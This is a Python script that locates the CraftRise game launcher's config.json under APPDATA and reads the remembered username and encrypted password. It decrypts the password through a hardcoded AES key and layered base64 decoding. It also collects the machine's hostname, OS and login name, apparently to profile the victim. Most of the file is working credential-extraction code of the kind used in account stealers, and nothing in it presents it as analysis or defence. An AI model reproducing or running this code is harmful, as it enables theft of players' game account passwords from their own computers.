import base64
import json
import os
import socket
import platform
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_base64(encoded_str):
    try:
        decoded_bytes = base64.b64decode(encoded_str)
        return decoded_bytes.decode('utf-8')
    except Exception as e:
        return encoded_str

def decrypt_rise_version(s):
    try:
        s1 = decrypt_base64(s)
        s2 = decrypt_base64(s1)
        prefix = "3ebi2mclmAM7Ao2"
        suffix = "KweGTngiZOOj9d6"
        
        if not (s2.startswith(prefix) and s2.endswith(suffix)):
            return s2
            
        substring = s2[len(prefix):len(s2)-len(suffix)]
        final = decrypt_base64(substring)
        
        return final
    except Exception as e:
        return s

def decrypt_aes(encrypted_base64):
    try:
        key = "2640023187059250".encode('utf-8')
        encrypted_data = base64.b64decode(encrypted_base64)
        cipher = AES.new(key, AES.MODE_ECB)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        return decrypted_data.decode('utf-8')
    except Exception as e:
        return ""

def decrypt_password(encrypted_pass):
    try:
        decrypted_aes = decrypt_aes(encrypted_pass)
        
        if not decrypted_aes:
            return ""
        
        result = decrypt_rise_version(decrypted_aes)
        
        if '#' in result:
            return result.split('#')[0]
        
        return result
    except Exception as e:
        return ""

def get_system_info():
    try:
        return {
            "hostname": socket.gethostname(),
            "os": platform.system() + " " + platform.release(),
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": os.getlogin(),
            "computer_name": platform.node()
        }
    except Exception as e:
        return {
            "error": str(e),
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

def read_craftrise_config():
    result = {
        "success": False,
        "error": None,
        "config_found": False,
        "data": {}
    }
    
    try:
        appdata_path = os.getenv('APPDATA')
        config_path = os.path.join(appdata_path, '.craftrise', 'config.json')
        
        if not os.path.exists(config_path):
            result["error"] = f"Config dosyası bulunamadı: {config_path}"
            return result
        
        result["config_found"] = True
        
        with open(config_path, 'r', encoding='utf-8') as f:
            config_data = json.load(f)
        
        result["data"]["username"] = config_data.get('rememberName', '')
        result["data"]["encrypted_password"] = config_data.get('rememberPass', '')
        result["data"]["version"] = config_data.get('version', '')
        result["data"]["client_ram"] = config_data.get('clientRam', '')
        result["data"]["windows_type"] = config_data.get('windowsType', '')
        result["data"]["display"] = config_data.get('display', '')
        result["data"]["is_optimized_config"] = config_data.get('isOptimizedConfig', False)
        
        if result["data"]["encrypted_password"]:
            result["data"]["decrypted_password"] = decrypt_password(
                result["data"]["encrypted_password"]
            )
            result["success"] = True
        else:
            result["error"] = "Şifrelenmiş şifre bulunamadı"
        
        return result
    
    except Exception as e:
        result["error"] = f"Config okuma hatası: {str(e)}"
        return result 